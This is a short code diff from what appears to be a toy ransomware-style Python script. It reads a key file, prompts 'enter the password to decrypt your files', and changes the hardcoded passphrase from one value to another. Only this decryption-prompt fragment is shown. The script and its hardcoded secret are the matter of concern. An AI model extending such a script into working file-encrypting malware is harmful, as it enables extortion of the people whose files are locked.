@@ -14,7 +14,7 @@ print(files)
 
 with open('thekey.key','rb') as key:
 	secretkey = key.read()
-passphrase = '220881'
+passphrase = 'GTH3kf7'
 upassword = input('enter the password to decrypt your files: ')
 if upassword == passphrase:
 	for file in files:
